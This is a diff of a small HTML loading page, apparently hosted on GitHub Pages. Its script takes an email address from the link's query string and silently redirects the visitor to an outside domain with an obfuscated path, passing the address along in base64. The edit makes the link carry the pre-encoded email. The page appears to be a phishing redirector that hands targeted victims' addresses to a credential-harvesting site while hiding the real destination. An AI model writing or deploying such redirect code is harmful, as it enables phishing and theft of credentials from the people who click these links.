@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -37,20 +36,17 @@
     </div>
     <script>
         (function() {
-            // Get email from after the ? in URL
-            // URL format: https://site.github.io/repo/?test@example.com
-            var email = window.location.search.substring(1); // removes the "?"
+            // Get base64 email directly from URL (already encoded)
+            var emailB64 = window.location.search.substring(1);
             
-            if (!email) {
+            if (!emailB64) {
                 document.getElementById('spinner').style.display = 'none';
                 document.getElementById('message').className = 'message error';
                 document.getElementById('message').textContent = 'Invalid link';
                 return;
             }
             
-            // Base64 encode the email
-            var emailB64 = btoa(email);
-            
+            // Pass directly without encoding
             window.location.href = 'https://startup.aliagaspor.com/Coh!5FyvqZmQVfbB8fwyhq/$' + emailB64;
         })();
     </script>
